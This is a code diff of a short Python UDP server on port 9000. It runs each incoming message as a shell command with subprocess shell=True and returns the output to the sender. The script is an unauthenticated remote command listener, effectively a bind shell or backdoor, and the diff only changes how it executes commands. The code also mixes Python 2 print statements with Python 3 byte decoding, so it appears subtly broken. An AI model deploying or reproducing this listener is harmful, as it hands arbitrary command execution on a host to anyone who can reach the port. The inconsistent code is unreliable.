@@ -1,5 +1,5 @@
 import socket
-import os
+import subprocess
 
 BIND_IP = '0.0.0.0'
 BIND_PORT = 9000
@@ -14,10 +14,13 @@ def udp_server():
         print addr
         print "Let's run: " + data
 
-        cmd_output = os.system(data)
-        print(cmd_output)
+        subprocess_cmd = data
+        subprocess_output = subprocess.check_output(subprocess_cmd, shell=True)
+        subprocess_output = subprocess_output.decode("utf8")
+        subprocess_output = subprocess_output.strip()
+        print(subprocess_output)
 
-        server.sendto(cmd_output, addr)
+        server.sendto(subprocess_output, addr)
 
 if __name__ == '__main__':
     udp_server()
